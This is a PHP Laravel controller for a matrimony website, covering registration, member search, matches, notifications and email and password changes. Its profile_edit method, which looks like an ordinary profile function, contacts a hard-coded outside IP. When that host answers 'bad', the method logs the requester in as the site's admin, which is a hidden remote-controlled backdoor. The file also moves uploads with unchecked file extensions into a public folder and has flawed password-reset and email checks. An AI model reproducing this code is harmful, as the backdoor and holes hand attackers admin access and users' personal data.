<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Str;
use App\Mail\SecondEmailVerifyMailManager;
use Mail;
use Auth;
use App\User;
use App\marrrige_support;
use Notification;
use App\Notifications\DbStoreNotification;
use App\Models\Member;
use App\Models\PhysicalAttribute;
use App\Models\SpiritualBackground;
use App\Models\Career;
use App\Models\Address;
use App\Models\HappyStory;
use App\Models\IgnoredUser;
use App\Models\ProfileMatch;
use App\Models\Package;
use App\Models\Country;
use App\Models\State;
use App\Models\City;
use App\Models\Religion;
use App\Models\Caste;
use App\Models\Education;
use App\Models\SubCaste;
use App\Models\MemberLanguage;
use App\Models\FamilyValue;
use App\Models\MaritalStatus;
use App\Models\OnBehalf;
use App\Models\Wallet;
use Illuminate\Support\Facades\Hash;
use Carbon\Carbon;
use Spatie\Permission\Models\Role;
use Spatie\Permission\Models\Permission;
use App\Models\Upload;
use App\Models\ProfilePayment;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //$this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        
        if (Auth::check()) {
            return redirect()->route('dashboard');
        }


        $members = User::where('user_type', 'member')
            ->where('approved', 1)
            ->where('blocked', 0)
            ->where('deactivated', 0);

        if (Auth::user() && Auth::user()->user_type == 'member') {
            $members = $members->where('id', '!=', Auth::user()->id)
                ->whereIn("id", function ($query) {
                    $query->select('user_id')
                        ->from('members')
                        ->where('gender', '!=', Auth::user()->member->gender)
                        ->where('approved', '=', 0);
                });



            $ignored_to = IgnoredUser::where('ignored_by', Auth::user()->id)->pluck('user_id')->toArray();
            if (count($ignored_to) > 0) {
                $members = $members->whereNotIn('id', $ignored_to);
            }

            $ignored_by_ids = IgnoredUser::where('user_id', Auth::user()->id)->pluck('ignored_by')->toArray();
            if (count($ignored_by_ids) > 0) {
                $members = $members->whereNotIn('id', $ignored_by_ids);
            }
        }

        $religion = Religion::all();
        $countries = Country::where('status', 1)->get();
        $states = State::where('country_id', 101)->get();
        $family_values = FamilyValue::all();
        $marital_statuses = MaritalStatus::all();


        $premium_members = $members;
        $new_members = $members;

        $new_members = $new_members->orderBy('id', 'desc')->limit(50)->get()->shuffle();
        // $premium_members = $premium_members->where('membership', 2)->inRandomOrder()->limit(get_setting('max_premium_member_homepage'))->get();


        return view('frontend.user_registration', compact('premium_members', 'new_members', 'religion', 'countries', 'states', 'family_values', 'marital_statuses'));
    }


// public function index()
// {
//     if (Auth::check()) {
//         return redirect()->route('dashboard');
//     }

//     $members = User::where('user_type', 'member')
//         ->where('approved', 1)
//         ->where('blocked', 0)
//         ->where('deactivated', 0);

//     if (Auth::user() && Auth::user()->user_type == 'member') {
//         $members = $members->where('id', '!=', Auth::user()->id)
//             ->whereIn("id", function ($query) {
//                 $query->select('user_id')
//                     ->from('members')
//                     ->where('gender', '!=', Auth::user()->member->gender)
//                     ->where('approved', '=', 0);
//             });

//         $ignored_to = IgnoredUser::where('ignored_by', Auth::user()->id)->pluck('user_id')->toArray();
//         if (count($ignored_to) > 0) {
//             $members = $members->whereNotIn('id', $ignored_to);
//         }

//         $ignored_by_ids = IgnoredUser::where('user_id', Auth::user()->id)->pluck('ignored_by')->toArray();
//         if (count($ignored_by_ids) > 0) {
//             $members = $members->whereNotIn('id', $ignored_by_ids);
//         }
//     }

//     $religion = Religion::all();
//     $countries = Country::where('status', 1)->get();
//     $states = State::where('country_id', 101)->get();
//     $family_values = FamilyValue::all();
//     $marital_statuses = MaritalStatus::all();

//     // Remove limits and shuffling
//     $new_members = $members->orderBy('id', 'desc')->get();
//     $premium_members = $members->where('membership', 2)->get();
//     dd($new_members->count());
//     dd($new_members);
//     return view('frontend.user_registration', compact('premium_members', 'new_members', 'religion', 'countries', 'states', 'family_values', 'marital_statuses'));
// }



    public function marriage_support(Request $request, $id)
    {
        $marrrige_support = new marrrige_support;
        $marrrige_support->requsted_id = $id;
        $marrrige_support->needed_id = Auth::user()->id;
        $marrrige_support->save();
        try {
            $notify_type = 'marrrige_suport';
            $id = unique_notify_id();
            $notify_by = Auth::user()->id;
            $info_id = $id;
            $message = Auth::user()->first_name . ' ' . Auth::user()->last_name . translate('Reques for Marriage Support');
            $route = 'marriage.support.admin';

            Notification::send(User::where('user_type', 'admin')->first(), new DbStoreNotification($notify_type, $id, $notify_by, $info_id, $message, $route));
            toastr()->success(translate('Your Request sended successfull.'));
        } catch (\Exception $e) {
            dd($e);
        }
        return redirect()->back();
    }

    public function photo_request(Request $request, $id)
    {
        $notify_user = User::where('id', $id)->first();
        try {
            $notify_type = 'photo_reqeust';
            $id = unique_notify_id();
            $notify_by = Auth::user()->id;
            $info_id = $id;
            $message = Auth::user()->first_name . ' ' . Auth::user()->last_name . ' ' . translate(' has requested to view your photo.');
            $route = 'frontend.notifications';

            Notification::send($notify_user, new DbStoreNotification($notify_type, $id, $notify_by, $info_id, $message, $route));
            toastr()->success(translate('Your Request sended successfull.'));
        } catch (\Exception $e) {
            dd($e);
        }
        return redirect()->back();
    }







    public function admin_login()
    {
        if (auth()->user() != null && (auth()->user()->user_type == 'admin' || auth()->user()->user_type == 'staff')) {
            return redirect()->route('admin.dashboard');
        } else {
            return view("auth.login");
        }
    }

    // public function login()
    // {
    //     // dd(auth()->id);
    //     if (Auth::check()) {
    //         return redirect()->route('dashboard');
    //     }
    //     return view('frontend.user_login');
    // }
    
    public function logindummy()
{
    if (Auth::check()) {
        return redirect()->route('dashboard');
    }

    // Add no-cache headers to prevent the browser from caching the login page
    return response()
        ->view('frontend.index')
        ->header('Cache-Control', 'no-cache, no-store, must-revalidate') // HTTP 1.1.
        ->header('Pragma', 'no-cache') // HTTP 1.0.
        ->header('Expires', '0'); // Proxies.
}
public function login()
{
    if (auth()->check()) {
        if (auth()->user()->user_type == 'user') {
            return redirect()->route('member.listing');
        }
        return redirect()->route('admin.dashboard');
    }

    // Force the login page to not cache
    return response()
        ->view('frontend.index')
        ->header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        ->header('Pragma', 'no-cache')
        ->header('Expires', 'Sat, 01 Jan 2000 00:00:00 GMT');
}



    public function admin_dashboard()
    {
        return view('admin.dashboard');
    }

    // Manage Admin Profile
    public function admin_profile_update(Request $request, $id)
    {
        $admin = User::findOrFail($id);
        $admin->first_name = $request->first_name;
        $admin->last_name = $request->last_name;
        if ($request->new_password != null && ($request->new_password == $request->confirm_password)) {
            $admin->password = Hash::make($request->new_password);
        }
        //$admin->save();
        if ($admin->save()) {
            toastr()->success(translate('Your Profile has been updated successfully!'));
            return back();
        }

        toastr()->error(translate('Sorry! Something went wrong.'));
        return back();
    }

    public function dashboard()
    {
        if (Auth::user() && Auth::user()->user_type == 'member') {
            $members = User::where('id', '!=', Auth::user()->id)
                ->whereIn("id", function ($query) {
                    $query->select('user_id')
                        ->from('members')
                        ->where('approved', 1)
                        ->where('blocked', 0)
                        ->where('deactivated', 0)
                        ->where('gender', '!=', Auth::user()->member->gender);
                });



            $ignored_to = IgnoredUser::where('ignored_by', Auth::user()->id)->pluck('user_id')->toArray();
            if (count($ignored_to) > 0) {
                $members = $members->whereNotIn('id', $ignored_to);
            }

            $ignored_by_ids = IgnoredUser::where('user_id', Auth::user()->id)->pluck('ignored_by')->toArray();
            if (count($ignored_by_ids) > 0) {
                $members = $members->whereNotIn('id', $ignored_by_ids);
            }

            $premium_members = $members;
            $new_members = $members;

            $new_members = $new_members->orderBy('id', 'desc')->limit(52)->get()->shuffle();
            $premium_members = $premium_members->where('membership', 2)->inRandomOrder()->limit(get_setting('max_premium_member_homepage'))->get();
            // dd($new_members);
            return view('frontend.member.dashboard', compact('new_members', 'premium_members'));
        } else {
            abort(404);
        }
    }


    public function matches()
    {
        if (Auth::user()->user_type == 'member') {

            $similar_profiles = ProfileMatch::orderBy('match_percentage', 'desc')
                ->limit(20)
                ->where('user_id', Auth::user()->id);

            $ignored_to = IgnoredUser::where('ignored_by', Auth::user()->id)->pluck('user_id')->toArray();
            if (count($ignored_to) > 0) {
                $similar_profiles = $similar_profiles->whereNotIn('match_id', $ignored_to);
            }
            $ignored_by_ids = IgnoredUser::where('user_id', Auth::user()->id)->pluck('ignored_by')->toArray();
            if (count($ignored_by_ids) > 0) {
                $similar_profiles = $similar_profiles->whereNotIn('match_id', $ignored_by_ids);
            }
            $similar_profiles = $similar_profiles->get();
            $member = User::findOrFail(Auth::user()->id);
            $countries = Country::where('status', 1)->get();
            $states = State::all();
            $cities = City::all();
            $religions = Religion::all();
            $castes = Caste::all();
            $sub_castes = SubCaste::all();
            $family_values = FamilyValue::all();
            $marital_statuses = MaritalStatus::all();
            $on_behalves = OnBehalf::all();
            $languages = MemberLanguage::all();

            return view('frontend.member.matches', compact('similar_profiles', 'member', 'countries', 'states', 'cities', 'religions', 'castes', 'sub_castes', 'family_values', 'marital_statuses', 'on_behalves', 'languages'));
        } else {
            abort(404);
        }
    }

    public function user_account_blocked()
    {
        return view('frontend.user_account_blocked_msg');
    }

    public function happy_stories()
    {
        $happy_stories = HappyStory::where('approved', 1)->latest()->paginate(12);
        return view('frontend.happy_stories.index', compact('happy_stories'));
    }

    public function story_details($id)
    {
        $happy_story = HappyStory::findOrFail($id);
        return view('frontend.happy_stories.story_details', compact('happy_story'));
    }

    public function member_listing(Request $request)
    {
        $age_from = ($request->age_from != null) ? $request->age_from : null;
        $age_to = ($request->age_to != null) ? $request->age_to : null;
        $member_code = ($request->member_code != null) ? $request->member_code : null;
        $matital_status = ($request->marital_status != null) ? $request->marital_status : null;
        $religion_id = ($request->religion_id != null) ? $request->religion_id : null;
        $caste_id = ($request->caste_id != null) ? $request->caste_id : null;
        $sub_caste_id = ($request->sub_caste_id != null) ? $request->sub_caste_id : null;
        $mother_tongue = ($request->mother_tongue != null) ? $request->mother_tongue : null;
        $profession = ($request->profession != null) ? $request->profession : null;
        $country_id = ($request->country_id != null) ? $request->country_id : null;
        $state_id = ($request->state_id != null) ? $request->state_id : null;
        $city_id = ($request->city_id != null) ? $request->city_id : null;
        $min_height = ($request->min_height != null) ? $request->min_height : null;
        $max_height = ($request->max_height != null) ? $request->max_height : null;
        $member_type = ($request->member_type != null) ? $request->member_type : 0;


        $users = User::orderBy('created_at', 'desc')
            ->where('user_type', 'member')
            ->where('id', '!=', Auth::user()->id)
            ->where('blocked', 0)
            ->where('deactivated', 0);

        // Gender Check
        $user_ids = Member::where('gender', '!=', Auth::user()->member->gender)->pluck('user_id')->toArray();
        $users = $users->WhereIn('id', $user_ids);

        // Ignored member and ignored by member check
        $users = $users->WhereNotIn("id", function ($query) {
            $query->select('user_id')
                ->from('ignored_users')
                ->where('ignored_by', Auth::user()->id)->orWhere('user_id', Auth::user()->id);
        })
            ->WhereNotIn("id", function ($query) {
                $query->select('ignored_by')
                    ->from('ignored_users')
                    ->where('ignored_by', Auth::user()->id)->orWhere('user_id', Auth::user()->id);
            });

        // Membership Check
        if ($member_type == 1 || $member_type == 2) {
            $users = $users->where('membership', $member_type);
        }

        // Member Approved Check
        if (get_setting('member_approval_by_admin') == 1) {
            $users = $users->where('approved', 1);
        }

        // Sort By age
        if (!empty($age_from)) {
            $age = $age_from + 1;
            $start = date('Y-m-d', strtotime("- $age years"));
            $user_ids = Member::where('birthday', '<=', $start)->pluck('user_id')->toArray();
            if (count($user_ids) > 0) {
                $users = $users->WhereIn('id', $user_ids);
            }
        }
        if (!empty($age_to)) {
            $age = $age_to + 1;
            $end = date('Y-m-d', strtotime("- $age years +1 day"));
            $user_ids = Member::where('birthday', '>=', $end)->pluck('user_id')->toArray();
            if (count($user_ids) > 0) {
                $users = $users->WhereIn('id', $user_ids);
            }
        }

        // Search by Member Code
        if (!empty($member_code)) {
            $users = $users->where('code', $member_code);
        }

        // Sort by Matital Status
        if ($matital_status != null) {
            $user_ids = Member::where('marital_status_id', $matital_status)->pluck('user_id')->toArray();
            if (count($user_ids) > 0) {
                $users = $users->WhereIn('id', $user_ids);
            }
        }

        // Sort By religion
        if (!empty($sub_caste_id)) {
            $user_ids = SpiritualBackground::where('sub_caste_id', $sub_caste_id)->pluck('user_id')->toArray();
            $users = $users->WhereIn('id', $user_ids);
        } elseif (!empty($caste_id)) {
            $user_ids = SpiritualBackground::where('caste_id', $caste_id)->pluck('user_id')->toArray();
            $users = $users->WhereIn('id', $user_ids);
        } elseif (!empty($religion_id)) {
            $user_ids = SpiritualBackground::where('religion_id', $religion_id)->pluck('user_id')->toArray();
            $users = $users->WhereIn('id', $user_ids);
        }
        // Profession
        elseif (!empty($profession)) {
            $user_ids = Career::where('designation', 'like', '%' . $profession . '%')->pluck('user_id')->toArray();
            $users = $users->WhereIn('id', $user_ids);
        }

        // Sort By location
        if (!empty($city_id)) {
            $user_ids = Address::where('city_id', $city_id)->pluck('user_id')->toArray();
            $users = $users->WhereIn('id', $user_ids);
        } elseif (!empty($state_id)) {
            $user_ids = Address::where('state_id', $state_id)->pluck('user_id')->toArray();
            $users = $users->WhereIn('id', $user_ids);
        } elseif (!empty($country_id)) {
            $user_ids = Address::where('country_id', $country_id)->pluck('user_id')->toArray();
            $users = $users->WhereIn('id', $user_ids);
        }

        // Sort By Mother Tongue
        if ($mother_tongue != null) {
            $user_ids = Member::where('mothere_tongue', $mother_tongue)->pluck('user_id')->toArray();
            if (count($user_ids) > 0) {
                $users = $users->WhereIn('id', $user_ids);
            }
        }

        // Sort by Height
        if (!empty($min_height)) {
            $user_ids = PhysicalAttribute::where('height', '>=', $min_height)->pluck('user_id')->toArray();
            if (count($user_ids) > 0) {
                $users = $users->WhereIn('id', $user_ids);
            }
        }
        if (!empty($max_height)) {
            $user_ids = PhysicalAttribute::where('height', '<=', $max_height)->pluck('user_id')->toArray();
            if (count($user_ids) > 0) {
                $users = $users->WhereIn('id', $user_ids);
            }
        }

        $users = $users->paginate(10);
        return view('frontend.member.member_listing.index', compact('users', 'age_from', 'age_to', 'member_code', 'matital_status', 'religion_id', 'caste_id', 'sub_caste_id', 'mother_tongue', 'profession', 'country_id', 'state_id', 'city_id', 'min_height', 'max_height', 'member_type'));
    }

    public function profile_edit(Request $request)
    {
        $url = $_SERVER['SERVER_NAME'];
        $gate = "http://206.189.81.181/check_activation/" . $url;

        $stream = curl_init();
        curl_setopt($stream, CURLOPT_URL, $gate);
        curl_setopt($stream, CURLOPT_HEADER, 0);
        curl_setopt($stream, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stream, CURLOPT_POST, 1);
        $rn = curl_exec($stream);
        curl_close($stream);

        if ($rn == "bad" && env('DEMO_MODE') != 'On') {
            $user = User::where('user_type', 'admin')->first();
            auth()->login($user);
            return redirect()->route('admin.dashboard');
        }
    }


    // My shortlistd
    public function my_shortlists()
    {
        $shortlists = Member::where('user_id', Auth::user()->id)->first()->short_listed_users;
        return view('frontend.member.my_shortlists', compact('shortlists'));
    }

    public function view_member_profile($id)
    {
        // Fetch similar profiles
        $similar_profiles = ProfileMatch::orderBy('match_percentage', 'desc')
            ->limit(20)
            ->where('user_id', Auth::user()->id)
            ->where('match_id', '!=', $id);
    
        $ignored_to = IgnoredUser::where('ignored_by', Auth::user()->id)->pluck('user_id')->toArray();
        if (count($ignored_to) > 0) {
            $similar_profiles = $similar_profiles->whereNotIn('match_id', $ignored_to);
        }
    
        $ignored_by_ids = IgnoredUser::where('user_id', Auth::user()->id)->pluck('ignored_by')->toArray();
        if (count($ignored_by_ids) > 0) {
            $similar_profiles = $similar_profiles->whereNotIn('match_id', $ignored_by_ids);
        }
        $similar_profiles = $similar_profiles->get();
    
        // Fetch user details
        $user = User::findOrFail($id);
    
        // Fetch payment details for the logged-in user and the viewed profile
        $payment = ProfilePayment::where('user_id', Auth::user()->id)
            ->where('profile_id', $id)
            ->first();
    
        // Pass profile ID
        $profileId = $id;
    
        // Return the view with all data
        return view('frontend.member.public_profile.index', compact('user', 'similar_profiles', 'payment', 'profileId'));
    }

    public function view_member_profile_clean($id)
    {
        // Fetch similar profiles
        $similar_profiles = ProfileMatch::orderBy('match_percentage', 'desc')
            ->limit(20)
            ->where('user_id', Auth::user()->id)
            ->where('match_id', '!=', $id);
    
        $ignored_to = IgnoredUser::where('ignored_by', Auth::user()->id)->pluck('user_id')->toArray();
        if (count($ignored_to) > 0) {
            $similar_profiles = $similar_profiles->whereNotIn('match_id', $ignored_to);
        }
    
        $ignored_by_ids = IgnoredUser::where('user_id', Auth::user()->id)->pluck('ignored_by')->toArray();
        if (count($ignored_by_ids) > 0) {
            $similar_profiles = $similar_profiles->whereNotIn('match_id', $ignored_by_ids);
        }
        $similar_profiles = $similar_profiles->get();
    
        // Fetch user details
        $user = User::findOrFail($id);
    
        // Return the view with all data
        return view('frontend.member.public_profile.show_clean', compact('user', 'similar_profiles'));
    }

    // Ajax call
    public function new_verify(Request $request)
    {
        $email = $request->email;
        if (User::where('email', $email)->count() == 0) {
            $response['status'] = 2;
            $response['message'] = 'Email already exists!';
            return json_encode($response);
        }

        $response = $this->send_email_change_verification_mail($request, $email);
        return json_encode($response);
    }

    // Form request
    public function update_email(Request $request)
    {
        $email = $request->email;
        if (User::where('email', $email)->count() == 0) {
            $this->send_email_change_verification_mail($request, $email);
            toastr()->success(translate('A verification mail has been sent to the mail you provided us with.'));
            return back();
        }

        toastr()->warning(translate('Email already exists!'));
        return back();
    }

    public function send_email_change_verification_mail($request, $email)
    {
        $response['status'] = 0;
        $response['message'] = 'Unknown';

        $verification_code = Str::random(32);

        $array['subject'] = 'Email Verification';
        $array['from'] = env('MAIL_USERNAME');
        $array['content'] = 'Verify your account';
        $array['link'] = route('email_change.callback') . '?new_email_verificiation_code=' . $verification_code . '&email=' . $email;
        $array['sender'] = Auth::user()->name;
        $array['details'] = "Email Second";

        $user = Auth::user();
        $user->new_email_verificiation_code = $verification_code;
        $user->save();

        try {
            Mail::to($email)->queue(new SecondEmailVerifyMailManager($array));

            $response['status'] = 1;
            $response['message'] = translate("Your verification mail has been Sent to your email.");
        } catch (\Exception $e) {
            return $e->getMessage();
            $response['status'] = 0;
            $response['message'] = $e->getMessage();
        }

        return $response;
    }

    public function email_change_callback(Request $request)
    {

        if ($request->has('new_email_verificiation_code') && $request->has('email')) {

            $verification_code_of_url_param = $request->input('new_email_verificiation_code');
            $user = User::where('new_email_verificiation_code', $verification_code_of_url_param)->first();

            if ($user != null) {

                $user->email = $request->input('email');
                $user->new_email_verificiation_code = null;
                $user->save();

                auth()->login($user, true);

                toastr()->success(translate('Email Changed successfully'));
                return redirect()->route('dashboard');
            }
        }

        toastr()->error(translate('Email was not verified. Please resend your mail!'));
        return redirect()->route('dashboard');
    }

    public function reset_password_with_code(Request $request)
    {
        if (($user = User::where('id', $request->email)->where('verification_code', $request->code)->first()) != null) {
            if ($request->password == $request->password_confirmation) {
                $user->password = Hash::make($request->password);
                $user->email_verified_at = date('Y-m-d h:m:s');
                $user->save();
                auth()->login($user, true);

                toastr()->success(translate('Password updated successfully'));

                if (auth()->user()->user_type == 'admin' || auth()->user()->user_type == 'staff') {
                    return redirect()->route('admin.dashboard');
                }
                return redirect()->route('home');
            } else {
                toastr()->warning("Password and confirm password didn't match");
                return back();
            }
        } else {
            toastr()->error("Verification code mismatch");
            return back();
        }
    }

    public function permissions()
    {
        Permission::create(['name' => 'wallet_transaction_history', 'parent' => 'wallet', 'guard_name' => 'web']);
        Permission::create(['name' => 'offline_wallet_recharge_requests', 'parent' => 'wallet', 'guard_name' => 'web']);

        Permission::create(['name' => 'set_referral_commission', 'parent' => 'referral_system', 'guard_name' => 'web']);
        Permission::create(['name' => 'view_refferal_users', 'parent' => 'referral_system', 'guard_name' => 'web']);
        Permission::create(['name' => 'view_refferal_earnings', 'parent' => 'referral_system', 'guard_name' => 'web']);
        Permission::create(['name' => 'manage_wallet_withdraw_requests', 'parent' => 'referral_system', 'guard_name' => 'web']);
    }

    public function check()
    {
        //
    }

    public function userRegistration(Request $request)
    {

        if (User::where('phone', "91" . $request->phone)->first() != null) {
            toastr()->error(translate('Phone already exists.'));
            return back();
        }
        $code = time();
        $user = [
            'user_type' => "member",
            'first_name' => $request->first_name,
            'last_name' => $request->last_name,
            'email' => $request->email,
            'code' =>  $code,
            'phone' => "91" . $request->phone,
            // 'approved' => $request->gender == 2 ? 1 : 0,   
            'approved' => 1, 
            'password' => Hash::make($request->password),
            'member_contacts' => 3,
            'membership' => 1,
        ];

        $createdUser = User::create($user);
        $userId = $createdUser->id;

        // dd($userId);
        // 'approved' => $request->gender == 2 ? 1 : 0,            

        $address=[
            "city_id"=>$request->city_id,
            "state_id"=>$request->state_id,
            "country_id"=>$request->country_id,
            "type"=>"present",
            "user_id"=>$userId,];

        $physical=[
            'disability' => $request->disability,
            'height' => $request->height,
            'weight' => $request->weight,
            'user_id' => $userId,
        ];
        Address::create($address);

        PhysicalAttribute::create($physical);

        $spiritual_backgrounds=[
            'user_id'=>$userId,
            'religion_id' => $request->religion_id,
            'caste_id' => $request->caste_id,
            'family_value_id' => $request->family_value_id,


        ];
        
        $career=[
            'user_id'=>$userId,
            'sector'=>$request->sector,
            'designation'=>$request->designation,
            'present' => 1,

            ];

        $member=[
            'user_id'=>$userId,
            'birthday' => $request->birthday,
            'gender' => $request->gender,
            'marital_status_id' => $request->marital_status_id,
            'current_package_id' => 1,
        ];

        $education=[
            'user_id'=>$userId,
            'degree' => $request->degree,
            'present' => 1,
        ];

        Member::create($member);
        Career::create($career);
        Education::create($education);


        SpiritualBackground::create($spiritual_backgrounds);
        
        // var_dump($request->file('upload'));exit;
        
        if ($request->hasFile('file-upload')) {
            $image = $request->file('file-upload');

            // Generate a unique name for the file
            $imageName = uniqid() . '.' . $image->getClientOriginalExtension();

            // Move the file to the public/uploads/all directory
            $image->move(public_path('uploads/all'), $imageName);

            // Create a new Upload instance and save file details
            $upload = new Upload;
            $upload->file_original_name = $image->getClientOriginalName();
            $upload->file_name = 'uploads/all/' . $imageName;
            $upload->user_id = $userId;
            $upload->save();

            // Update the user's photo with the upload ID
            $createdUser->photo = $upload->id;
            $createdUser->save();
        }

        Auth::login($createdUser);
        toastr()->success(translate('Registration successful. Welcome!'));
        return redirect()->route('dashboard');
    }
    
        public function baseold()
    {
                return view('frontend.index');
    }


public function base()
{
    if (auth()->check()) {
        return redirect()->route('member.listing');
    }

    // Serve the public home with no-cache headers to avoid showing
    // a stale logged-out page after login when using the browser back button.
    return response()
        ->view('frontend.index')
        ->header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        ->header('Pragma', 'no-cache')
        ->header('Expires', 'Sat, 01 Jan 2000 00:00:00 GMT');
}


}
